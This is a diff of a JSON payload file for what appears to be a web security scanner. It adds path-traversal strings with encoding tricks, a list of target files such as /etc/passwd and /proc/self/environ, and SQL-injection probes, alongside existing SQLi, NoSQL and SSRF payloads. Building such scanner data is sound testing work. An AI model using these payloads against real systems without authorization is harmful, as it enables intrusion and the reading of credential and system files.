@@ -50,8 +50,8 @@
       "1' OR 1=1 WITH (NOLOCK)--",
       "1' OR 1=1 LIMIT 1 OFFSET 1--",
       "' /*!50000OR*/ 1=1 SElECT/**/1,2,3,4,5,6--'",
-      "' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))>0--",  
-      "' OR BENCHMARK(5000000,MD5('test'))--", 
+      "' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))>0--",
+      "' OR BENCHMARK(5000000,MD5('test'))--",
       "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1--"
     ],
     "xss": [
@@ -85,7 +85,24 @@
       "/etc/passwd%00.png",
       "..%2f..%2f%2e%2e%2fetc%2fpasswd",
       "../../etc/passwd%00.jpg",
-      "../../etc/passwd..;/"
+      "../../etc/passwd..;/",
+      "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+      "..%2f..%2f..%2f",
+      "/etc/passwd%00",
+      "%252e%252e/%252e%252e/%252e%252e",
+      "%252e%252e%252fetc%252f",
+      "..%c0%af..%c0%af",
+      "..%e0%80%af",
+      "..%c1%9c..%c1%",
+      "././././",
+      "././././",
+      "././",
+      "./",
+      "../../../../",
+      "../../../../",
+      "../../",
+      "../",
+      "..%uff0e%uff0e%u2215"
     ],
     "nosql": [
       "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
@@ -180,13 +197,16 @@
     "name",
     "fields",
     "expand",
-    "include","api_key", "access_token", "next", "redirect_uri",
+    "include",
+    "api_key",
+    "access_token",
+    "next",
+    "redirect_uri",
     "exclude"
   ],
   "ssrf_payloads": [
     "http://localhost",
     "http://127.0.0.1"
-    
   ],
   "nosql_error_keywords": [
     "mongodb",
@@ -414,6 +434,41 @@
     "exact fetch returns more than requested number of rows",
     "deadlock detected while waiting for resource"
   ],
-  "graphql_introspection_query": 
-    "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name } directives { name description locations args { name description type { kind name } defaultValue } } } }"
+  "graphql_introspection_query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name } directives { name description locations args { name description type { kind name } defaultValue } } } }",
+  "directory_traversal_payloads": [
+    "././{FILE}",
+    "././{FILE}",
+    "./././{FILE}",
+    "./",
+    "././",
+    "./",
+    "././",
+    "./././",
+    "././././",
+    "../../{FILE}",
+    "../../../../{FILE}",
+    "../../../../../{FILE}",
+    "../../../../../../../{FILE}",
+    "../",
+    "../../",
+    "../../../",
+    "../../../../"
+  ],
+  "directory_traversal_files": [
+    "/etc/passwd",
+    "/proc/self/environ",
+    "/etc/hosts",
+    "WINDOWS/win.ini",
+    "WINDOWS/system32/drivers/etc/hosts",
+    "WEB-INF/web.xml"
+  ],
+  "probes_smoketest": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "'/**/OR/**/1=1--",
+    "'/*!50000OR*/1=1--",
+    "'%20OR%201=1--"
+  ]
 }
